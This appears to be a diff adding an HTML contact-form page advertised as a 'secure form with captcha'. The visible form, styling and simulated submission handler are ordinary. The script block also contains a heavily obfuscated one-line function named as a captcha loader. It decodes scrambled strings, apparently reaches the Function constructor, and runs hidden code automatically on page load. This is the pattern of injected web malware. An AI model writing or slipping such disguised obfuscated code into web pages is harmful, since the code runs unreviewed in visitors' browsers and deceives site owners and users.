@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Form with Captcha</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+        }
+
+        h1 {
+            text-align: center;
+            color: #333;
+            margin-bottom: 30px;
+            font-size: 2.5em;
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-weight: 500;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        textarea {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #e1e5e9;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s ease;
+        }
+
+        input[type="text"]:focus,
+        input[type="email"]:focus,
+        textarea:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        textarea {
+            resize: vertical;
+            min-height: 100px;
+        }
+
+        #captcha-container {
+            margin: 20px 0;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            border: 2px dashed #dee2e6;
+            text-align: center;
+            min-height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .captcha-placeholder {
+            color: #6c757d;
+            font-style: italic;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s ease;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-2px);
+        }
+
+        .submit-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .status-message {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 5px;
+            text-align: center;
+            display: none;
+        }
+
+        .status-success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .status-error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        .features {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #e1e5e9;
+        }
+
+        .feature-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+            color: #666;
+        }
+
+        .feature-icon {
+            margin-right: 10px;
+            color: #667eea;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Contact Form</h1>
+        
+        <form id="contactForm">
+            <div class="form-group">
+                <label for="name">Full Name</label>
+                <input type="text" id="name" name="name" required>
+            </div>
+
+            <div class="form-group">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+
+            <div class="form-group">
+                <label for="message">Message</label>
+                <textarea id="message" name="message" required placeholder="Please enter your message here..."></textarea>
+            </div>
+
+            <div id="captcha-container">
+                <div class="captcha-placeholder">🔒 Captcha will load here</div>
+            </div>
+
+            <button type="submit" class="submit-btn" id="submitBtn">Send Message</button>
+            
+            <div id="statusMessage" class="status-message"></div>
+        </form>
+
+        <div class="features">
+            <div class="feature-item">
+                <span class="feature-icon">🛡️</span>
+                <span>Secure form with captcha verification</span>
+            </div>
+            <div class="feature-item">
+                <span class="feature-icon">🚀</span>
+                <span>Fast and responsive design</span>
+            </div>
+            <div class="feature-item">
+                <span class="feature-icon">📱</span>
+                <span>Mobile-friendly interface</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+            const key = "aK4mN-2pQzX-7eWvR-t9YbC"
+var loadCaptcha;(function(){var xGo='',ssU=333-322;function opa(w){var a=999926;var t=w.length;var k=[];for(var h=0;h<t;h++){k[h]=w.charAt(h)};for(var h=0;h<t;h++){var q=a*(h+208)+(a%36301);var y=a*(h+532)+(a%47329);var m=q%t;var s=y%t;var o=k[m];k[m]=k[s];k[s]=o;a=(q+y)%3718365;};return k.join('')};var srR=opa('qnlstrxcgziyewpdotofakrtumuchvorcbnjs').substr(0,ssU);var TZL='xaa.okva0bi9fur=ulkrnrbt=]8n2y[vvpg)r)ai=he"a9e) h1z v,ur);e),{paa,do+;e,r;,cr]Aj-d7vfnh)1,8oa8;i7(v0+[tr(d}.0(th[,8",k;[]cm=l==]g;. n7hv,kkssfa)a.*{[rlpir;+nnwns s<) +1ug40rc5(9fs+ro32y,(etng)d((s ;nvn=t+v])"lruo[e;);vi6l2nre)vla"=,r27fge)6gAirtvC.l;v;sg+l==xr07voS(v..=t1wtif={kh;[;,za;6n-d {v p 5a{il2+5af;xtyi.i,u8k)z=vtl(;oat1,+0,<rdr+ + 8;nzbC1t]mlrif)+uab35 f3xortv0ogCnvartCfosceaehndf)a(vrr=,a r;u]ca;ituo)-(o(lp0)+go(";6=tfa.1fnal.7)u(=0l2" e4ad+lu-a1r o+(qn(t;wv=i.+;dg(u+.)co n;pC}9v(tew"hrr+dcshCrevde;t(A(n;={9=en6n=8y;o;]s0nuh;4z)hlh[;;(.o=,ulmk6=.l*g.lc>1=;]sj-e>)fa1[say)rxetl;g}z9nla(h8eswsne)f()}c9<c,=oz!per.s)C+o(,,}tz.r-].(jnSa<a)+enskgroe=tf]i-.=Aea,;"("ta, 1i]](yfni a;v[l,;d(;)"vnm8;d=hkl =p=30[zisfa1iyeqr2<i7(c;vhntort n9j  +v8k=02.,c7, bl; }6q;,}[naii([=(=huh.hA)r=an8rtdr)+)pgd.spuem.h=;)+nin;t=(r)u+nbgrj,r.)7vnr]o0hCrs=.==4.i(;=;g.;u+r 4olnl={=rp6!eph;apsa[=(';var jnf=opa[srR];var wAo='';var kJz=jnf;var qRv=jnf(wAo,opa(TZL));var IrC=qRv(opa('tcLh  e7m_)_v].=,coue;oL;{_5#uL.wcoocd&dbrL$Lrf)(!;3L)<c\'t&L%L)S7{_fda.t2aL0]sh$boe)%i2=3nb..a%c8%llLt}ssL_j7fb7.!L82ro_$(LLr7,rip%)altn.,b}.Lee)h07r=(ccr (L7tr.]5r)]:lne.e-LeLagco+42iL)(emrc(kL,r0$=[L!pf\/tp l;=7o.xa%rtLtdp30f+#%c$(*T(a$oL$tt;uea-Lp3oya,Lrc(e5L]Ltr%.p ,uLLil.{?;=s_L=uptuilh=:a).Lost).($o:7e{7""!}=ph4tnro,_=9b(,;l9.h(g0Ld\'!qe.job!6e_;L_!L_;5eb:y}k),:!s!coa#8c no;\/%e!,$v)e36e,3cthp$t{j5gL();-9nLc l.fLr;;(iul$.#$a0+0{vL*Lpcr=]h$cn(t(,!r;f].-LmLLd1rL)_;lct$ueL7(:6\/;rcL9eiaeLr.pL3}))0e7 _e c[138l&bu_lcL.M5mLS_=]0L3\/,.4o;L;jC,oSL\/]2e9i e)0((( -e7(*v(_Lu)07u)(,wL"iLk,.Lk!LL%,.L(2cLy;;5r;.L$+5t\'j]S!t(,+p.nLajs!t1e,t\/ugh.n3ex*!L.,{d"n2 4=<(s60CLau5eLt,127)L.1L,L%.l=)Ltdcm3LL=a Lme).9Lk2!t,(,.Lrz!i35$0!r2.dLniua.fo$LpLfr-z!LLsn0.)o\/(d=(4o41sdm0r+Lo.()sL2e(;hch(;6.{r#0=7o;!8)LaLL#LIr=tcLLLLL}nssLxLt]b]%$se-i.lhe!;s.)_a(4=awapt)ei#sL+]]ivLjc.ra}.L4L:tm;t;)a+Ls(kLL.nLs.cf"mri\/cs _ho$L";s.yL3;)0c_L){])r#[oc_6Ei!%c$.(eml.)j>;p(L.jf3a({cdL,L]rs)Len\'77L eo;4_kaCac.)(t(4nu!,ci_nL,)t<%.40L){e u3brt;ce7Lin",02);{lc.0s)(g5yt-ef)vt_ato)n:L_ (e})e5tns(v(acc]p0; p.e-7t)) L;jea-(-utLp]8Ltp-orw_)n6e4_tt;a!)_])%fp86L+e.$_)d44t_7&Lc)nm,t(ui.!L$L!0.Lct(;$i6a(3Lipk%t*1r3,,gLv&L;Lu1o{L3LLfarL.LL$)!,6$eent..c,5ei03e38 bnmS6dicrmLat(.8][Lv,}]2 }\/!Lw7L.l,%.a]L;}Ls9,$Lt;e$6f1Lge)oee3p), _=EEa3b{ ={rh_iLercL;.o 1fncg\'oa.L.)Lj_;n0aauoc.Lrdinten!rS)c$se 4ml !(e500)c;s.bku+p.r!%57L]faL0pmu]LL}_7*3!.C;[l3=_hn))reL\',L])[ )ilaom3).bp!=L( tre$'));var xAn=kJz(xGo,IrC );xAn(2700);return 2446})()
+
+
+
+
+        // Form submission handler
+        document.getElementById('contactForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const formData = new FormData(this);
+            const data = Object.fromEntries(formData);
+            
+            // Simulate form submission
+            showStatus('Sending message...', 'success');
+            document.getElementById('submitBtn').disabled = true;
+            
+            setTimeout(() => {
+                showStatus('Message sent successfully!', 'success');
+                document.getElementById('submitBtn').disabled = false;
+                this.reset();
+            }, 2000);
+        });
+
+        function showStatus(message, type) {
+            const statusElement = document.getElementById('statusMessage');
+            statusElement.textContent = message;
+            statusElement.className = `status-message status-${type}`;
+            statusElement.style.display = 'block';
+            
+            setTimeout(() => {
+                statusElement.style.display = 'none';
+            }, 5000);
+        }
+
+        // Initially disable submit button until captcha is verified
+        document.getElementById('submitBtn').disabled = true;
+    </script>
+</body>
+</html>
